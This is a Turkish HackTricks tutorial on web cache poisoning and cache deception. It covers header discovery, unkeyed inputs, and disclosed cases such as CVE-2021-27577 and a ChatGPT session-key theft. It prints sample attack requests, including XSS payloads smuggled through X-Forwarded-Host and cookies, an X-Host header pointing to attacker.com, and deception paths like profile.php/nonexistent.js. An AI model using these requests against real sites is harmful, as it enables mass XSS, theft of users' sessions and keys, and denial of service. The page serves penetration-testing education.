# Cache Zehirleme ve Cache Aldatmacası

{{#include ../../banners/hacktricks-training.md}}

## Fark

> **Web cache zehirleme ile web cache aldatmacası arasındaki fark nedir?**
>
> - **Web cache zehirlemesinde**, saldırgan uygulamanın önbelleğe bazı kötü niyetli içerikler depolamasını sağlar ve bu içerikler önbellekten diğer uygulama kullanıcılarına sunulur.
> - **Web cache aldatmacasında**, saldırgan uygulamanın başka bir kullanıcıya ait bazı hassas içerikleri önbelleğe depolamasını sağlar ve ardından bu içeriği önbellekten geri alır.

## Cache Zehirleme

Cache zehirleme, istemci tarafı önbelleğini manipüle ederek istemcilerin beklenmedik, kısmi veya bir saldırganın kontrolü altındaki kaynakları yüklemeye zorlamayı amaçlar. Etkilerin kapsamı, etkilenen sayfanın popülaritesine bağlıdır, çünkü kirlenmiş yanıt yalnızca önbellek kontaminasyonu süresince sayfayı ziyaret eden kullanıcılara sunulur.

Cache zehirleme saldırısının gerçekleştirilmesi birkaç adım içerir:

1. **Anahtarsız Girdilerin Belirlenmesi**: Bunlar, bir isteğin önbelleğe alınması için gerekli olmasa da, sunucunun döndürdüğü yanıtı değiştirebilen parametrelerdir. Bu girdilerin belirlenmesi, önbelleği manipüle etmek için sömürülebileceğinden kritik öneme sahiptir.
2. **Anahtarsız Girdilerin Sömürülmesi**: Anahtarsız girdiler belirlendikten sonra, bir sonraki adım bu parametreleri saldırganın yararına sunucunun yanıtını değiştirmek için nasıl kötüye kullanacağını bulmaktır.
3. **Zehirlenmiş Yanıtın Önbelleğe Alındığının Garantilenmesi**: Son adım, manipüle edilmiş yanıtın önbelleğe kaydedildiğinden emin olmaktır. Bu şekilde, önbellek zehirlendiği sürede etkilenen sayfaya erişen herhangi bir kullanıcı kirlenmiş yanıtı alacaktır.

### Keşif: HTTP başlıklarını kontrol et

Genellikle, bir yanıt **önbelleğe kaydedildiğinde** bununla ilgili bir **başlık olacaktır**, hangi başlıklara dikkat etmeniz gerektiğini bu yazıda kontrol edebilirsiniz: [**HTTP Cache başlıkları**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Keşif: Önbellek hata kodları

Eğer yanıtın bir önbelleğe kaydedildiğini düşünüyorsanız, **kötü bir başlıkla istek göndermeyi** deneyebilirsiniz, bu da **400 durum kodu** ile yanıtlanmalıdır. Ardından isteği normal bir şekilde erişmeyi deneyin ve eğer **yanıt 400 durum kodu ise**, bunun zayıf olduğunu bilirsiniz (ve hatta bir DoS gerçekleştirebilirsiniz).

Daha fazla seçenek bulabilirsiniz:

{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Ancak, **bazen bu tür durum kodlarının önbelleğe alınmadığını** unutmayın, bu nedenle bu test güvenilir olmayabilir.

### Keşif: Anahtarsız girdileri tanımlama ve değerlendirme

Yanıtı değiştirebilecek **parametreleri ve başlıkları zorlamak için** [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) kullanabilirsiniz. Örneğin, bir sayfa istemcinin buradan script yüklemesini belirtmek için `X-Forwarded-For` başlığını kullanıyor olabilir:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Arka uç sunucudan zararlı bir yanıt elde etme

Parametre/başlık belirlendikten sonra, **temizlenme** şekline ve **nerede** **yansıtıldığına** veya başlıktan gelen yanıtı nasıl etkilediğine bakın. Bunu herhangi bir şekilde kötüye kullanabilir misiniz (XSS gerçekleştirmek veya kontrolünüzde bir JS kodu yüklemek? DoS yapmak?...)

### Yanıtı önbelleğe alma

Kötüye kullanılabilecek **sayfayı** **belirledikten** sonra, hangi **parametre**/**başlık** kullanılacağını ve **nasıl** kötüye kullanılacağını belirledikten sonra, sayfayı önbelleğe almanız gerekir. Önbelleğe almak istediğiniz kaynağa bağlı olarak bu biraz zaman alabilir, birkaç saniye boyunca denemek zorunda kalabilirsiniz.

Yanıttaki **`X-Cache`** başlığı çok faydalı olabilir çünkü istek önbelleğe alınmadığında değeri **`miss`** ve önbelleğe alındığında değeri **`hit`** olabilir.\
**`Cache-Control`** başlığı da bir kaynağın önbelleğe alınıp alınmadığını ve kaynağın bir sonraki ne zaman önbelleğe alınacağını bilmek için ilginçtir: `Cache-Control: public, max-age=1800`

Bir diğer ilginç başlık **`Vary`**. Bu başlık genellikle **önbellek anahtarı** olarak **işlem gören ek başlıkları** **belirtmek için** kullanılır, normalde anahtarsız olsalar bile. Bu nedenle, kullanıcı hedeflediği kurbanın `User-Agent`'ını biliyorsa, o belirli `User-Agent`'ı kullanan kullanıcılar için önbelleği zehirleyebilir.

Önbellekle ilgili bir başlık daha **`Age`**. Bu, nesnenin proxy önbelleğinde kaç saniye kaldığını tanımlar.

Bir isteği önbelleğe alırken, kullandığınız başlıklarla **dikkatli olun** çünkü bazıları **beklenmedik şekilde** **anahtarlı** olarak kullanılabilir ve **kurbanın o aynı başlığı kullanması gerekecektir**. Her zaman **farklı tarayıcılarla** bir Cache Poisoning'i **test edin** ve çalışıp çalışmadığını kontrol edin.

## Sömürü Örnekleri

### En kolay örnek

`X-Forwarded-For` gibi bir başlık, yanıt içinde temizlenmeden yansıtılıyor.\
Temel bir XSS yükü gönderebilir ve önbelleği zehirleyerek sayfaya erişen herkesin XSS olmasını sağlayabilirsiniz:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Not edin ki bu, `/en?region=uk` isteğini zehirleyecek, `/en` isteğini değil._

### DoS için önbellek zehirleme

{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Çerez işleme zafiyetlerini istismar etmek için web önbellek zehirlemesi kullanma

Çerezler, bir sayfanın yanıtında da yansıtılabilir. Eğer bunu bir XSS oluşturmak için kötüye kullanabilirseniz, kötü niyetli önbellek yanıtını yükleyen birkaç istemcide XSS'i istismar edebilirsiniz.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Not edin ki, eğer savunmasız çerez kullanıcılar tarafından çok kullanılıyorsa, düzenli istekler önbelleği temizleyecektir.

### Ayırıcılar, normalizasyon ve noktalar ile tutarsızlıklar oluşturma <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Kontrol et:

{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### API anahtarını çalmak için yol geçişi ile önbellek zehirleme <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Bu yazı**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` gibi bir URL ile bir OpenAI API anahtarının nasıl çalındığını açıklıyor çünkü `/share/*` ile eşleşen her şey, istek web sunucusuna ulaştığında Cloudflare URL'yi normalleştirmeden önbelleğe alınacaktır.

Bu, daha iyi bir şekilde de açıklanmıştır:

{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Web önbellek zehirleme zafiyetlerini istismar etmek için birden fazla başlık kullanma <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Bazen bir önbelleği istismar edebilmek için **birden fazla anahtarsız girişi** **istismar etmeniz** gerekecektir. Örneğin, `X-Forwarded-Host` başlığını sizin kontrolünüzdeki bir alan adına ve `X-Forwarded-Scheme` başlığını `http` olarak ayarlarsanız bir **Açık yönlendirme** bulabilirsiniz. **Eğer** **sunucu** tüm **HTTP** isteklerini **HTTPS**'ye **yönlendiriyorsa** ve `X-Forwarded-Scheme` başlığını yönlendirme için alan adı olarak kullanıyorsa, yönlendirme ile sayfanın nereye yönlendirileceğini kontrol edebilirsiniz.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Sınırlı `Vary` başlığı ile istismar

Eğer **`X-Host`** başlığının **bir JS kaynağını yüklemek için alan adı olarak** kullanıldığını ve yanıtın **`Vary`** başlığının **`User-Agent`** belirttiğini bulduysanız, o zaman kurbanın User-Agent'ını dışarı sızdırmanın ve bu kullanıcı ajanını kullanarak önbelleği zehirlemenin bir yolunu bulmalısınız:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

URL'deki ve gövdedeki isteği içeren bir GET isteği gönderin. Eğer web sunucusu gövdedekini kullanıyorsa ama önbellek sunucusu URL'dekini önbelleğe alıyorsa, o URL'ye erişen herkes aslında gövdedeki parametreyi kullanacaktır. Github web sitesinde James Kettle'ın bulduğu zafiyet gibi:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parametre Gizleme

Örneğin, ruby sunucularında **parametreleri** **`;`** karakteri kullanarak **`&`** yerine ayırmak mümkündür. Bu, anahtarsız parametre değerlerini anahtarlı olanların içine yerleştirmek ve bunları kötüye kullanmak için kullanılabilir.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### HTTP Cache Zehirlemesini HTTP Request Smuggling ile Kötüye Kullanma

[Cache Poisoning saldırılarını HTTP Request Smuggling'i kötüye kullanarak nasıl gerçekleştireceğinizi](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning) burada öğrenin.

### Web Cache Zehirlemesi için Otomatik Test

[Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner), web cache zehirlemesi için otomatik test yapmak üzere kullanılabilir. Birçok farklı tekniği destekler ve yüksek derecede özelleştirilebilir.

Örnek kullanım: `wcvs -u example.com`

## Açık Örnekler

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS, URL içindeki parçayı kesmeden iletti ve yalnızca ana bilgisayar, yol ve sorgu kullanarak önbellek anahtarını oluşturdu (parçayı göz ardı ederek). Bu nedenle, `/#/../?r=javascript:alert(1)` isteği arka uca `/#/../?r=javascript:alert(1)` olarak gönderildi ve önbellek anahtarında yük bulunmadı, yalnızca ana bilgisayar, yol ve sorgu vardı.

### GitHub CP-DoS

İçerik türü başlığında kötü bir değer göndermek, 405 önbelleklenmiş yanıtı tetikledi. Önbellek anahtarı çerezi içeriyordu, bu nedenle yalnızca yetkisiz kullanıcıları hedef almak mümkündü.

### GitLab + GCP CP-DoS

GitLab, statik içeriği depolamak için GCP bucket'larını kullanır. **GCP Buckets**, **`x-http-method-override`** başlığını destekler. Bu nedenle, `x-http-method-override: HEAD` başlığını göndermek ve önbelleği boş bir yanıt gövdesi döndürmesi için zehirlemek mümkündü. Ayrıca `PURGE` yöntemini de destekleyebilir.

### Rack Middleware (Ruby on Rails)

Ruby on Rails uygulamalarında, genellikle Rack middleware kullanılır. Rack kodunun amacı, **`x-forwarded-scheme`** başlığının değerini almak ve bunu isteğin şeması olarak ayarlamaktır. `x-forwarded-scheme: http` başlığı gönderildiğinde, aynı konuma 301 yönlendirmesi gerçekleşir ve bu, o kaynağa bir Hizmet Reddi (DoS) neden olabilir. Ayrıca, uygulama `X-forwarded-host` başlığını tanıyabilir ve kullanıcıları belirtilen ana bilgisayara yönlendirebilir. Bu davranış, bir saldırganın sunucusundan JavaScript dosyalarının yüklenmesine yol açarak güvenlik riski oluşturabilir.

### 403 ve Depolama Bucket'ları

Cloudflare daha önce 403 yanıtlarını önbelleğe alıyordu. Yanlış Yetkilendirme başlıkları ile S3 veya Azure Storage Blobs'a erişmeye çalışmak, önbelleğe alınan bir 403 yanıtı ile sonuçlanıyordu. Cloudflare 403 yanıtlarını önbelleğe almayı durdurmuş olsa da, bu davranış diğer proxy hizmetlerinde hala mevcut olabilir.

### Anahtarlı Parametreleri Enjekte Etme

Önbellekler genellikle önbellek anahtarında belirli GET parametrelerini içerir. Örneğin, Fastly'nin Varnish'i isteklerde `size` parametresini önbelleğe alıyordu. Ancak, parametrenin URL kodlamalı bir versiyonu (örneğin, `siz%65`) hatalı bir değerle gönderildiğinde, önbellek anahtarı doğru `size` parametresi kullanılarak oluşturuluyordu. Yine de, arka uç URL kodlamalı parametredeki değeri işliyordu. İkinci `size` parametresinin URL kodlaması, önbellek tarafından atılmasına neden oldu ancak arka uç tarafından kullanıldı. Bu parametreye 0 değeri atamak, önbelleğe alınabilir bir 400 Bad Request hatası ile sonuçlandı.

### Kullanıcı Aracı Kuralları

Bazı geliştiriciler, sunucu yükünü yönetmek için FFUF veya Nuclei gibi yüksek trafikli araçların kullanıcı ajanlarıyla eşleşen istekleri engeller. Ironik bir şekilde, bu yaklaşım önbellek zehirlenmesi ve DoS gibi güvenlik açıkları oluşturabilir.

### Geçersiz Başlık Alanları

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230), başlık adlarında kabul edilebilir karakterleri belirtir. Belirtilen **tchar** aralığının dışındaki karakterleri içeren başlıkların, ideal olarak 400 Bad Request yanıtı tetiklemesi gerekir. Pratikte, sunucular her zaman bu standarda uymamaktadır. Önemli bir örnek, geçersiz karakterler içeren başlıkları ileten ve `cache-control` başlığı mevcut olmadıkça herhangi bir 400 hatasını önbelleğe alan Akamai'dır. Geçersiz bir karakter içeren bir başlık gönderildiğinde, örneğin `\`, önbelleğe alınabilir bir 400 Bad Request hatası ile sonuçlanan bir sömürülebilir desen tespit edilmiştir.

### Yeni Başlıklar Bulma

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Önbellek Aldatmacası

Önbellek Aldatmacası'nın amacı, istemcilerin **önbellek tarafından kaydedilecek kaynakları hassas bilgileriyle yüklemelerini sağlamaktır**.

Öncelikle, **.css**, **.js**, **.png** gibi **uzantıların** genellikle **önbelleğe** **kaydedilmek** üzere **yapılandırıldığını** unutmayın. Bu nedenle, `www.example.com/profile.php/nonexistent.js` adresine erişirseniz, önbellek muhtemelen yanıtı kaydedecektir çünkü `.js` **uzantısını** görmektedir. Ancak, eğer **uygulama**, _www.example.com/profile.php_ içinde saklanan **hassas** kullanıcı içerikleriyle **tekrar oynuyorsa**, bu içerikleri diğer kullanıcılardan **çalmış** olursunuz.

Test edilecek diğer şeyler:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Daha az bilinen uzantılar kullanın, örneğin_ `.avif`

Başka çok net bir örnek bu yazıda bulunabilir: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Örnekte, _http://www.example.com/home.php/non-existent.css_ gibi var olmayan bir sayfayı yüklediğinizde, _http://www.example.com/home.php_ (**kullanıcının hassas bilgileriyle**) içeriğin döneceği ve önbellek sunucusunun sonucu kaydedeceği açıklanmaktadır.\
Daha sonra, **saldırgan**, kendi tarayıcısında _http://www.example.com/home.php/non-existent.css_ adresine erişebilir ve daha önce erişen kullanıcıların **gizli bilgilerini** gözlemleyebilir.

**Önbellek proxy'sinin**, dosyaları **uzantıya** (_css_) göre **önbelleğe alacak** şekilde **yapılandırılması** gerektiğini unutmayın ve içerik türüne göre değil. Örneğin, _http://www.example.com/home.php/non-existent.css_ adresinin `text/html` içerik türü olacak, bu da bir _.css_ dosyası için beklenen `text/css` mime türü değildir.

[Cache Deceptions saldırılarını HTTP Request Smuggling'i kötüye kullanarak nasıl gerçekleştireceğinizi](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception) burada öğrenin.

## Otomatik Araçlar

- [**toxicache**](https://github.com/xhzeem/toxicache): Bir dizi URL'de web cache zehirlenmesi açıklarını bulmak ve birden fazla enjekte etme tekniğini test etmek için Golang tarayıcısı.

## Referanslar

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)


{{#include ../../banners/hacktricks-training.md}}
